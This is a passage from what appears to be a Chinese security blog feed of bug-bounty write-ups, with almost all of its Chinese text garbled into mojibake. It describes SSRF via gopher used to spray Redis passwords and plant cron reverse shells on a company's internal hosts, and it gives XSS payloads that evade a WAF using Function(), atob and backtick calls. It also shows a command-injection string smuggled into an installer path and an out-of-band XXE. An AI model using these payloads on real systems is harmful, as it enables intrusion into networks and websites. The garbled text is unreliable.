src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216051.png" alt="image-20211224190757303"></p><p>POSTéšä¾¿ä¼ ä¸ªå‚è¿‡å»ï¼Œå‘ç°æ¥å£æç¤ºâ€Request error, content-type was unsupportedâ€</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216439.png" alt="image-20211224191101242"></p><p>å¾ˆå¥½ï¼Œç»§ç»­FUZZ content-type header(è®°å¾—æŠŠpayload_processingè‡ªåŠ¨ç¼–ç ç»™å…³æ‰)</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216538.png" alt="image-20211224192131756"></p><p>FUZZå‡ºæ¥application&#x2F;jsonçš„content-typeå¤´å¯ç”¨ï¼Œé‚£ä¹ˆå¾ˆç®€å•äº†ï¼Œæ„é€ JSONæ•°æ®ï¼Œç»§ç»­FUZZ JSONæ•°æ®å‚æ•°</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216253.png" alt="image-20211224192458939"></p><h2 id="0x03-SSRFæ— è„‘åˆ°æ‰‹"><a href="#0x03-SSRFæ— è„‘åˆ°æ‰‹" class="headerlink" title="0x03 SSRFæ— è„‘åˆ°æ‰‹"></a>0x03 SSRFæ— è„‘åˆ°æ‰‹</h2><p>å‚æ•°ä¸ºimage_urlï¼Œç¨æœ‰ç»éªŒçš„æœ‹å‹å°±å¯ä»¥å€Ÿæ­¤åˆ¤æ–­å‡ºï¼Œå¾ˆå¯èƒ½è¿™ä¸ªå‚æ•°æ˜¯åŠ è½½è¿œç¨‹å›¾ç‰‡çš„</p><p>ç›´æ¥è¿›è¡ŒSSRFæµ‹è¯•</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216847.png" alt="image-20211224193009475"></p><p>æœåŠ¡å™¨æ”¶åˆ°äº†è¯·æ±‚ï¼Œç»æµ‹è¯•gopherï¼Œdictï¼Œhttpç­‰å¸¸è§„åè®®éƒ½å¯ä»¥ä½¿ç”¨~</p><p>ä¹‹å‰é€šè¿‡å„ç§åŸŸåäºŒçº§ç›®å½•æˆ–æ ¹ç›®å½•çš„springæ³„éœ²ï¼Œä¸‹è½½heapdumpï¼ŒOQLè°ƒè¯•å‡ºredisæ˜æ–‡å¯†ç </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216281.jpg" alt="image-20220306153718729"></p><p>æ”¶é›†äº†ä¸å°‘è¯¥å‚å•†å†…ç½‘redisçš„ipå’Œå¯†ç ï¼Œä¹Ÿäº†è§£åˆ°è¯¥å‚å•†çš„å†…ç½‘ç½‘æ®µ</p><p>å°è¯•åˆ©ç”¨æœ¬å¤„SSRFå®Œå…¨å¯ä»¥æ‰¹é‡å¯¹å†…ç½‘Redisè¿›è¡Œå¯†ç å–·æ´’+åå¼¹shellå¯¹è¾¹ç•Œè¿›è¡Œçªç ´</p><h2 id="0x04-åˆ©ç”¨gopheråè®®å¯¹å†…ç½‘è„†å¼±ç½‘æ®µæ‰¹é‡Rediså¯†ç å–·æ´’åå¼¹Shell"><a href="#0x04-åˆ©ç”¨gopheråè®®å¯¹å†…ç½‘è„†å¼±ç½‘æ®µæ‰¹é‡Rediså¯†ç å–·æ´’åå¼¹Shell" class="headerlink" title="0x04 åˆ©ç”¨gopheråè®®å¯¹å†…ç½‘è„†å¼±ç½‘æ®µæ‰¹é‡Rediså¯†ç å–·æ´’åå¼¹Shell"></a>0x04 åˆ©ç”¨gopheråè®®å¯¹å†…ç½‘è„†å¼±ç½‘æ®µæ‰¹é‡Rediså¯†ç å–·æ´’åå¼¹Shell</h2><p>æ™®åŠä¸€ä¸ªçŸ¥è¯†ï¼šä¸æœªæˆæƒç›´æ¥è®¿é—®çš„redisä¸åŒï¼ŒåŠ å…¥å¯†ç è®¤è¯çš„redisåœ¨å‘½ä»¤è¡Œé“¾æ¥æ—¶ä¼šå¤šä¸€ä¸ª-aå‚æ•°æŒ‡å®šå¯†ç </p><p>å¦‚å›¾æ‰€ç¤ºå¦‚æœä¸ä¼ å‚å¯†ç ï¼Œåˆ™æ— æ³•æ‰§è¡Œä»»ä½•redisæŒ‡ä»¤<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216420.png" alt="image"></p><p>è€ŒåŠ å…¥å¯†ç è®¤è¯åredisï¼Œåœ¨æ•´ä¸ªRESQåè®®æµé‡ä¸­è¡¨ç°å¦‚ä¸‹<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216485.png" alt="image"></p><p>è®¤è¯è¿‡ç¨‹ä¸­ä¼šå¤šä¸€ä¸ªAuth</p><p>å†™è„šæœ¬æ¥æ„é€ gopheræ•°æ®ï¼Œæ³¨æ„æŠŠè¿™å—AuthåŠ ä¸Š,åç»­å¸¸è§„æ“ä½œå†™è®¡åˆ’ä»»åŠ¡åå¼¹SHELL</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216507.png" alt="image"></p><p>åˆ©ç”¨ä¸Šé¢æŒ–æ˜åˆ°çš„SSRFç‚¹ï¼Œé…åˆä¹‹å‰è‡ªå·±æ”¶é›†åˆ°çš„å†…ç½‘rediså¯†ç å’Œè„†å¼±ç½‘æ®µ</p><p>ç›´æ¥é€šè¿‡intruderæ‰¹é‡è·‘å†…ç½‘çš„è„†å¼±ç½‘æ®µredisï¼Œè¿›è¡Œå¯†ç å–·æ´’ï¼Œå–·æ´’ä¸€ä½†æˆåŠŸï¼Œåˆ™ä¼šå†™å…¥è®¡åˆ’ä»»åŠ¡</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217584.png" alt="image-20230419221700540"></p><p>æœ€ç»ˆåŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººï¼Œåœ¨ä¸€ä¸ªç½‘æ®µï¼Œå¼¹å›æ¥äº†åå‡ ä¸ªShellã€‚ã€‚ã€‚</p><p>å‚å•†çš„å†…ç½‘Redisä¸»æœºè¿˜èƒ½å‡ºç½‘ï¼Œå±å®æ˜¯å†…ç½‘å®‰å…¨åšçš„ç¨€çƒ‚äº†ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216585.png" alt="image"></p><h2 id="0x04-åè¨€"><a href="#0x04-åè¨€" class="headerlink" title="0x04 åè¨€"></a>0x04 åè¨€</h2><p>è¿™ä¸ªæ´æ˜¯åœ¨å¹³å®‰å¤œæŒ–åˆ°çš„~ç®—æ˜¯åœ£è¯è´ºç¤¼å•¦</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(äº”)-å¤šæ‰‹æ³•ç»•è¿‡WAFæŒ–æ˜æŸçŸ¥åå‚å•†XSS</title>
      <link href="/2021/12/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%BA%94-%E5%A4%9A%E6%89%8B%E6%B3%95%E7%BB%95%E8%BF%87WAF%E6%8C%96%E6%8E%98%E6%9F%90%E7%9F%A5%E5%90%8D%E5%8E%82%E5%95%86XSS/"/>
      <url>/2021/12/22/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%BA%94-%E5%A4%9A%E6%89%8B%E6%B3%95%E7%BB%95%E8%BF%87WAF%E6%8C%96%E6%8E%98%E6%9F%90%E7%9F%A5%E5%90%8D%E5%8E%82%E5%95%86XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-å‰å¥"><a href="#0x01-å‰å¥" class="headerlink" title="0x01 å‰å¥"></a>0x01 å‰å¥</h2><p>æœ€è¿‘åœ¨æµ‹è¯•æŸçŸ¥åå®‰å…¨å‚å•†çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°å…¶ä¸€å¤„é‡è¦ä¸šåŠ¡çš„å­åŸŸç«Ÿå‡ºç°äº†éš¾å¾—ä¸€è§çš„è‡ªç ”WAFï¼Œå¦‚æ­¤ä¸€æ¥å‹¾èµ·äº†æˆ‘çš„å…´è¶£~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214230.png" alt="image-20230419221229711"></p><p>ä»”ç»†ç ”ç©¶è¯¥ä¸šåŠ¡ç‚¹åï¼Œå‘ç°æŸå¤„ä¼ å‚ï¼Œä¼šç›´æ¥å°†ä¼ å‚å†…å®¹å†™å…¥JSä¸­ï¼Œå¤§å¤§çš„å±é™©</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214677.png" alt="image-20230419221243010"></p><p>äºæ˜¯ä¸WAFçš„ä¸€æ¬¡äº¤é”‹ä¾¿ä»æ­¤åˆ»å¼€å§‹~</p><h2 id="0x02-å¹³é™çš„é—­åˆä¸å¸¸è§„æ“ä½œ"><a href="#0x02-å¹³é™çš„é—­åˆä¸å¸¸è§„æ“ä½œ" class="headerlink" title="0x02 å¹³é™çš„é—­åˆä¸å¸¸è§„æ“ä½œ"></a>0x02 å¹³é™çš„é—­åˆä¸å¸¸è§„æ“ä½œ</h2><p>ç”±ä¸Šå›¾çš„è¾“å‡ºä½ç½®å¯çŸ¥ï¼Œæ— WAFæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡</p><pre><code class="js">â€™)]</code></pre><p>ä¸‰ä¸ªç¬¦å·æ¥é—­åˆå‰åŠéƒ¨åˆ†JSï¼Œå†ç”¨&#x2F;&#x2F;æ³¨é‡Šåæ–¹JSï¼Œå†ç›´æ¥evalæ‰§è¡ŒJSä»£ç å³å¯</p><p>æ„é€ Payload</p><pre><code class="js">%27)];eval(alert(&#39;xss&#39;))//</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214040.png" alt="image-20230419221253870"></p><p>ç”±äºevalï¼Œalertï¼Œæ‹¬å·ç­‰å¤ªæ•æ„Ÿ~æ¯«æ— ç–‘é—®ï¼Œç›´æ¥è¢«WAFç§’äº†</p><p>é‚£åªèƒ½ç”¨ç»éªŒä¸æ€è·¯æ¥é€æ¸æ›¿æ¢æ‰è¿™äº›æ•æ„Ÿçš„å‡½æ•°å…³é”®è¯äº†~</p><h2 id="0x03-å¤šæ‰‹æ³•ç»„åˆç»•è¿‡WAF"><a href="#0x03-å¤šæ‰‹æ³•ç»„åˆç»•è¿‡WAF" class="headerlink" title="0x03 å¤šæ‰‹æ³•ç»„åˆç»•è¿‡WAF"></a>0x03 å¤šæ‰‹æ³•ç»„åˆç»•è¿‡WAF</h2><h3 id="è§£å†³eval"><a href="#è§£å†³eval" class="headerlink" title="è§£å†³eval"></a>è§£å†³eval</h3><p>é¦–å…ˆè§£å†³çš„æ˜¯evalè¢«æ‹¦æˆªçš„é—®é¢˜</p><p>åœ¨JSä¸­ç»•è¿‡å¯¹äºevalçš„æ‹¦æˆªï¼Œå¯ä»¥ä½¿ç”¨Function()åŠ¨æ€æ„é€ å‡½æ•°</p><p>è¿™é‡Œç”¨åˆ°äº† Function()æ„é€ å‡½æ•°çš„ä¸€ä¸ªç‰¹æ€§, Function()æ„é€ å‡½æ•°è™½ç„¶ä¸æ˜¯å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯äº†è§£ä¸€ä¸‹è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚</p><p>ä¸ç®¡æ˜¯é€šè¿‡å‡½æ•°å®šä¹‰è¯­å¥è¿˜æ˜¯å‡½æ•°ç›´æ¥é‡è¡¨è¾¾å¼ï¼Œå‡½æ•°çš„å®šä¹‰éƒ½è¦ä½¿ç”¨ function()å…³é”®å­—ã€‚</p><p>ä½†æ˜¯å•å‡½æ•°è¿˜å¯ä»¥é€šè¿‡Function()æ„é€ å‡½æ•°æ¥å®šä¹‰ï¼Œæ¯”å¦‚ï¼š</p><pre><code class="js">var f = new Function(&quot;x&quot;,&quot;y&quot;,&quot;return x*y&quot;);</code></pre><p>è¿™ä¸€è¡Œçš„å®é™…æ•ˆæœå’Œä¸‹é¢çš„ä¸€è¡Œä»£ç æ˜¯ç­‰ä»·çš„ã€‚</p><pre><code class="js">var f=function(x,y)&#123;x*y&#125;;</code></pre><p>Function()æ„é€ å‡½æ•°å¯ä»¥ä¼ å…¥ä»»æ„æ•°é‡çš„å­—ç¬¦ä¸²å®å‚ï¼Œæœ€åä¸€ä¸ªå®å‚æ‰€è¡¨ç¤ºçš„æ–‡æœ¬æ˜¯å‡½æ•°ä½“ï¼›å®ƒå¯ä»¥åŒ…å«ä»»æ„çš„Javascript è¯­å¥ï¼Œæ¯æ¡è¯­å¥ä¹‹é—´ç”¨åˆ†å·åˆ†å‰²ã€‚</p><p>æˆ‘ä»¬ä¾æ®è¿™ä¸ªç‰¹æ€§å°±å¯ä»¥ä½¿ç”¨Function()æ¥ä»£æ›¿eval()</p><p>EG:</p><pre><code class="js">Function(alert(&#39;xss&#39;))</code></pre><pre><code>eval(alert(&#39;xss&#39;))</code></pre><p>ä¸¤è€…æ˜¯ç­‰æ•ˆçš„</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214276.png" alt="image-20230419221311737"></p><p>æ”¹é€ æˆ‘ä»¬çš„Payload</p><pre><code>?%27]);Function(test)()//</code></pre><p>å‘ç°æœªæ‹¦æˆª</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214464.png" alt="image-20230419221323981"></p><p>ç›´æ¥Functionå†…ä½¿ç”¨å‡½æ•°</p><pre><code class="js">%27]);Function(alert(&#39;xss&#39;))()//</code></pre><p>ä¸å‡ºæ„å¤–ï¼Œç›´æ¥GGäº†~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214702.png" alt="image-20230419221343757"></p><p>ä¸‹é¢æ€è€ƒçš„å°±æ˜¯å¦‚ä½•ç»•è¿‡å¯¹äºå‡½æ•°çš„æ£€æµ‹</p><h3 id="ç»•è¿‡å‡½æ•°æ£€æµ‹"><a href="#ç»•è¿‡å‡½æ•°æ£€æµ‹" class="headerlink" title="ç»•è¿‡å‡½æ•°æ£€æµ‹"></a>ç»•è¿‡å‡½æ•°æ£€æµ‹</h3><p>ç›´æ¥alertæ—¢ç„¶è¢«æ‹¦æˆªï¼Œæˆ‘ä»¬å°±ä½¿ç”¨atobæ¥è§£å¯†base64çš„çš„JS</p><p>EG:</p><pre><code class="js">atob(&quot;YWxlcnQoInhzcyIp&quot;)  //base64ç¼–ç çš„alert(&#39;xss&#39;)</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214898.png" alt="image-20230419221354879"></p><p>æ„é€ Payload</p><pre><code class="JS">%27]);Function(atob(&#39;YWxlcnQoInhzcyIp&#39;)))()//</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214084.png" alt="image-20230419221405330"></p><p>Md,åˆå¯„äº†~ä¼°è®¡æ˜¯æ­£åˆ™æ£€æµ‹äº†atob + ()çš„å‡½æ•°ä½¿ç”¨â€¦</p><p>æ²¡äº‹ï¼Œå†ç”¨JSçš„ä¸€ä¸ªç‰¹æ€§ï¼Œåå¼•å·æ¥ä»£æ›¿æ‹¬å·ï¼‹å¼•å·</p><pre><code class="js">atob`YWxlcnQoInhzcyIp`</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214355.png" alt="image-20230419221415346"></p><p>æ„é€ Payload</p><pre><code class="js">%27]);Function(atob`YWxlcnQoInhzcyIp`)()//</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192214509.png" alt="image-20230419221427174"></p><p>å¼¹å¼¹å¼¹ï¼Œå¼¹èµ°é±¼å°¾çº¹</p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>æœ¬åˆXSSç»•è¿‡WAFæ€»å…±ç”¨äº†å››ä¸ªç®€å•çš„TIPS</p><p>1.è¾“å‡ºåœ¨JSå†…çš„é—­åˆä¸æ³¨é‡Š</p><p>2.Function()æ¥ä»£æ›¿eval()</p><p>3.atobè§£å¯†base64åŠ å¯†çš„JS</p><p>4.åå¼•å·ä»£æ›¿æ‹¬å·ä¸å¼•å·</p><p>æ‰€ä»¥ï¼Œå¤§å¤šæ•°ä¸šåŠ¡åœºæ™¯å¹¶ä¸æ˜¯æ²¡æœ‰æ¼æ´ï¼Œå¤§éƒ¨åˆ†æƒ…å†µæ˜¯å—æŒ–æ˜è€…è„‘ä¸­çš„åˆ©ç”¨é“¾ä¸å§¿åŠ¿æ‰€é™ã€‚</p><p>å„ç§å°æ‰‹æ³•ç»„åˆèµ·æ¥è¾¾åˆ°æ¼æ´åˆ©ç”¨æˆåŠŸçš„æ•ˆæœï¼Œæ˜¯ä¸€æ¬¡æœ‰è¶£çš„ç»å†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(å››)-è®°ä¸€æ¬¡æœ‰è¶£çš„å®¢æˆ·ç«¯RCE+æœåŠ¡ç«¯XXEæŒ–æ˜</title>
      <link href="/2021/12/21/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%9B%9B-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AFRCE-%E6%9C%8D%E5%8A%A1%E7%AB%AFXXE%E6%8C%96%E6%8E%98/"/>
      <url>/2021/12/21/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%9B%9B-%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AFRCE-%E6%9C%8D%E5%8A%A1%E7%AB%AFXXE%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-èµ·å› "><a href="#0x01-èµ·å› " class="headerlink" title="0x01 èµ·å› "></a>0x01 èµ·å› </h2><p>æœ‹å‹ç»™æŸç”²æ–¹åšæ¸—é€æµ‹è¯•ï¼Œå¥ˆä½•ç”²æ–¹æ˜¯æŸçŸ¥åä¿é™©ï¼Œç³»ç»Ÿå¤ªè€è‰¹ï¼ŒåŠå¤©ä¸å‡ºè´§</p><p>å…„å¼Ÿå–Šæˆ‘æ¥ä¸€å—æ¥çœ‹ï¼Œäºæ˜¯æœ‰äº†æœ¬æ–‡</p><h2 id="0x02-å®¢æˆ·ç«¯RCEä¸€å¤„"><a href="#0x02-å®¢æˆ·ç«¯RCEä¸€å¤„" class="headerlink" title="0x02 å®¢æˆ·ç«¯RCEä¸€å¤„"></a>0x02 å®¢æˆ·ç«¯RCEä¸€å¤„</h2><p>æœ‹å‹æŠŠé¶æ ‡å‘ç»™æˆ‘çœ‹äº†ä¸‹ï¼Œé™¤äº†ä¸¤ä¸ªä¸‹è½½é“¾æ¥å•¥ä¹Ÿæ²¡æœ‰</p><p><a href="https://s2.loli.net/2021/12/21/8hKoUZP1etXN2Si.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142157.png" alt="img"></a></p><p>é“¾æ¥ä¸‹è½½ä¸‹æ¥çš„ä¸œè¥¿å¦‚å›¾ï¼Œçœ‹äº†ä¸‹ç›®å½•é‡Œé¢è¿˜æœ‰JREï¼Œé‚£ä¹ˆå¾ˆæ˜¾ç„¶ï¼Œè¿™å®¢æˆ·ç«¯exeå°±æ˜¯ä¸ªJAVAå¯åŠ¨å‘½ä»¤æ‰§è¡Œå¥—å£³</p><p><a href="https://s2.loli.net/2021/12/21/e1DOnsSfbil6HZN.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142831.png" alt="img"></a></p><p>éšåæ‰“å¼€programæ–‡ä»¶å¤¹ï¼Œé€†äº†ä¸€ä¸‹é‡Œé¢çš„Jar</p><p>full_pathå‰é¢å®šä¹‰ä¸ºç”¨æˆ·æ›´æ–°æ—¶è¾“å…¥çš„è·¯å¾„</p><p><a href="https://s2.loli.net/2021/12/21/GowTki89rcO3UMK.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142221.png" alt="img"></a></p><p>é‚£ä¹ˆå¾ˆç®€å•äº†full_pathå¯æ§ï¼Œè¯±å¯¼ç”¨æˆ·å®‰è£…æ›´æ–°æ—¶è·¯å¾„å‡ºè¾“å…¥æ³¨å…¥å‘½ä»¤å³å¯</p><pre><code class="vbnet">D:\software  &amp;&amp; ping hacker&#39;s IP</code></pre><p><a href="https://s2.loli.net/2021/12/21/2hW4KzEODkfYypd.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192145028.png" alt="img"></a></p><h2 id="0x03-å‘ç°Webservice-Soapæ¥å£"><a href="#0x03-å‘ç°Webservice-Soapæ¥å£" class="headerlink" title="0x03 å‘ç°Webservice Soapæ¥å£"></a>0x03 å‘ç°Webservice Soapæ¥å£</h2><p>å…‰è¿™ä¸€ä¸ªæ°´æ¥çš„å®¢æˆ·ç«¯RCEè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæ¥ä¸‹æ¥ç»§ç»­æŒ–æ˜æœåŠ¡ç«¯</p><p>çœ‹äº†çœ‹æ²¡åˆ«çš„åŠŸèƒ½ç‚¹ï¼Œæˆ‘å°±ç®€å•FUZZäº†ä¸€ä¸‹è¿™ä¸ªç³»ç»Ÿä¸‰çº§ç›®å½•</p><p><a href="https://s2.loli.net/2021/12/21/4Vlu8vpcxKQJh16.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142659.png" alt="img"></a></p><p>æœ€åFUZZå‡ºæ¥äº†ä¸€ä¸ªwebserviceæ¥å£</p><p>http:&#x2F;&#x2F;****.xxxxxx.cn&#x2F;xxxx&#x2F;service</p><p><a href="https://s2.loli.net/2021/12/21/y9ZMhRDnfScHjLw.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142315.png" alt="img"></a></p><p>æ‹¼æ¥å‡ºå…¶wsdlæ¥å£</p><p>http:&#x2F;&#x2F;****.xxxxxx.cn&#x2F;xxxx&#x2F;service&#x2F;BusinessService?wsdl</p><p>ä½†å¯¼å…¥SoapUIæˆ–AWVSçš„è°ƒè¯•æ¨¡å—è¿›è¡Œè°ƒè¯•æ—¶å´å‘ç°å…¶å¯¼å…¥å¤±è´¥</p><p><a href="https://s2.loli.net/2021/12/21/NI9qyGLPTciphbn.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142655.png" alt="img"></a></p><p>ä»”ç»†çœ‹äº†ä¸‹WSDLè¿”å›çš„ä¿¡æ¯ã€‚ã€‚ã€‚å¦ˆçš„WSDL Import Locationå’ŒSoap Address Locationéƒ½æ˜¯å†…ç½‘åŸŸå</p><p><a href="https://s2.loli.net/2021/12/21/F3ijQ4PEH95ksD2.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142373.png" alt="img"></a></p><p>ä¸è¿‡å¹¸è¿çš„æ˜¯ï¼Œè¯¥ç³»ç»Ÿçš„å¤–ç½‘åŸŸåæ‹¼æ¥è·¯å¾„åä¹Ÿå¯ä»¥è®¿é—®åˆ°è¿™ä¸ªWSDLæ¥å£</p><p>ä½†æ˜¯è‡ªåŠ¨åŒ–çš„Soapæ¥å£è°ƒè¯•å·¥å…·æ˜¯â€œçœ‹è§ä»€ä¹ˆå°±importä»€ä¹ˆâ€ï¼Œè¿™å¯è®©äººçŠ¯äº†éš¾</p><h2 id="0x04å¯¼å…¥SoapUI"><a href="#0x04å¯¼å…¥SoapUI" class="headerlink" title="0x04å¯¼å…¥SoapUI"></a>0x04å¯¼å…¥SoapUI</h2><p>æ€è€ƒäº†ä¸€ä¼šï¼Œçªç„¶æƒ³èµ·æ¥BurpSuiteå¯ä»¥æŠŠRequestBodyå’ŒResponseBodyçš„å€¼è¿›è¡Œæ›¿æ¢ï¼Œhhhï¼Œé‚£æˆ‘ä»¬å°±æœ‰åŠæ³•å¯¼å…¥äº†</p><p>åœ¨Burpsuiteçš„Porxy Optionä¸­å¢åŠ Match&amp;Replaceè§„åˆ™</p><p>å°†WSDL Import Locationå’ŒSoap Address Locationå¤„å¯¹åº”çš„å†…ç½‘åŸŸåéƒ½æ›¿æ¢ä¸ºå¤–ç½‘åŸŸå</p><p><a href="https://s2.loli.net/2021/12/21/whrn98TC7kbJZ6Q.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142262.png" alt="img"></a></p><p>éšååœ¨SoapUIä¸­è®¾ç½®Proxy</p><p><a href="https://s2.loli.net/2021/12/21/iEwOydTQM4tYVGh.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142058.png" alt="img"></a></p><p>æ‰“å¼€ä»£ç†ï¼Œå†æ¬¡æ·»åŠ WSDLï¼ŒResponseBodyçš„å†…ç½‘åŸŸåæˆåŠŸè¢«æ›¿æ¢ï¼ŒWSDLå¯¼å…¥æˆåŠŸ~</p><p><a href="https://s2.loli.net/2021/12/21/IvfRJ9Y5doPpLWy.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142963.png" alt="img"></a></p><h2 id="0x05-XXEæŒ–æ˜"><a href="#0x05-XXEæŒ–æ˜" class="headerlink" title="0x05 XXEæŒ–æ˜"></a>0x05 XXEæŒ–æ˜</h2><p>å¯¼å…¥æ¥å£åï¼Œå‘ç°æœ‰å‚æ•°ä¸ºdataXMLï¼Œå¿ƒä¸­æš—å–œXXEä¼°è®¡æ˜¯é€ä¸Šé—¨äº†</p><p><a href="https://s2.loli.net/2021/12/21/utaD2qUYXIfZ968.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142408.png" alt="img"></a></p><p>ç›´æ¥BurpSuiteä¸­åˆ©ç”¨XXE OOBæµ‹è¯•</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142925.jpg" alt="image-20220306152639003"></p><p>OOBæˆåŠŸï¼ŒXXEåˆ°æ‰‹ï¼Œæ”¶æ‘Š~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192142372.jpg" alt="image-20220604155438953"></p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>åšæŒä¸€ä¸‹ï¼Œå®ˆå¾—äº‘å¼€è§æœˆæ˜ï¼Œæ¼æ´å°±åœ¨çœ¼å‰~</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(ä¸‰)-æ— è„‘æŒ–æ˜æŸSRC getshell</title>
      <link href="/2021/11/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%89-%E6%97%A0%E8%84%91%E6%8C%96%E6%8E%98%E6%9F%90SRC-getshell/"/>
      <url>/2021/11/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%89-%E6%97%A0%E8%84%91%E6%8C%96%E6%8E%98%E6%9F%90SRC-getshell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x02-èµ„äº§æ”¶é›†åˆ°è„†å¼±ç³»ç»Ÿ"><a href="#0x02-èµ„äº§æ”¶é›†åˆ°è„†å¼±ç³»ç»Ÿ" class="headerlink" title="0x02 èµ„äº§æ”¶é›†åˆ°è„†å¼±ç³»ç»Ÿ"></a>0x02 èµ„äº§æ”¶é›†åˆ°è„†å¼±ç³»ç»Ÿ</h2><p>åœ¨æŸæ•°å­—å‚srcæŒ–æ˜è¿‡ç¨‹ä¸­ï¼Œæœ¬äººé€šè¿‡sslè¯ä¹¦å¯¹åŸŸåèµ„äº§è¿›è¡Œäº†æ”¶é›†ï¼Œé€šè¿‡è®¡ç®—åŸŸåå¯¹åº”ipæ®µçš„æƒé‡</p><p>æ•´ç†å‡ºå…¶èµ„äº§é›†ä¸­çš„Cæ®µï¼Œå¹¶è¿›è¡Œäº†æ‰¹é‡æµ‹æ´»+ç›®å½•æ‰«æ</p><p>æŸ¥çœ‹ç›®å½•æ‰«æç»“æœåï¼Œå‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶</p><p><a 